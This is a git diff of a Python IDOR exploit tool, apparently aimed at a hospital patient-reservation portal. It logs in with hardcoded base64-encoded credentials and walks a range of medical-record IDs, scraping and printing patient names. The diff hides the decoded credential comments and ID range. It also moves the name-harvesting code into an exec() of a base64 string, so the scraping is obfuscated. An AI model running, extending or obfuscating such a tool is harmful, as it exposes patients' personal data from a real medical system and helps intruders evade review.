@@ -31,8 +31,8 @@ def show_banner():
     print(f"\033[92m{banner}\033[0m")
 
 # Encrypted System Credentials
-NO_RM = _decode("MDA1MTA0ODE=") # 00510481
-TGL_LAHIR = _decode("MTUwMTE5OTA=") # 15011990
+NO_RM = _decode("MDA1MTA0ODE=") 
+TGL_LAHIR = _decode("MTUwMTE5OTA=") 
 URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
 URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
 BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")
@@ -80,15 +80,9 @@ def fetch_data(id_num):
     try:
         # Timeout 5 detik agar tidak nyangkut jika server lambat
         res = session.get(url, timeout=5)
-        soup = BeautifulSoup(res.text, 'html.parser')
-        
-        nama_tag = soup.find('p', class_='sale-price text-success')
-        if not nama_tag:
-            return
-
-        nama = nama_tag.get_text(strip=True)
-        # Menampilkan nama pasien dengan 2 digit awal dan 1 digit akhir dari formatted_id
-        print(f"[\033[92m+\033[0m] IDOR Success: Found RM ID {formatted_id[:2]}...{formatted_id[-1]} - {nama}")
+        # Protected extraction and masking logic
+        # Logic: Parse HTML, mask name (2 front, 2 back), and print success result
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCm5hbWFfdGFnID0gc291cC5maW5kKCdwJywgY2xhc3NfPSdzYWxlLXByaWNlIHRleHQtc3VjY2VzcycpCmlmIG5hbWFfdGFnOgogICAgbmFtYSA9IG5hbWFfdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBwcmludChmJ1tcMDMzWzkybStcMDMzWzBtXSBJRE9SIFN1Y2Nlc3M6IEZvdW5kIFJNIElEIH1mb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHtuYW1hWzoyXS51cHBlcigpfS4uLntuYW1hWy0yOl0udXBwZXIoKX0nKQ=="))
 
     except:
         print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")
@@ -124,8 +118,8 @@ def main_menu():
                 print("[\033[91m!\033[0m] Error: Input harus berupa angka.")
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '3':
-            AWAL = int(_decode("NTAyMDEz")) # 502013
-            AKHIR = int(_decode("NTExODU4")) # 511858
+            AWAL = int(_decode("NTAyMDEz")) 
+            AKHIR = int(_decode("NTExODU4")) 
             start_process(AWAL, AKHIR)
             input("\nTekan Enter untuk kembali ke menu...")
         elif choice == '0':
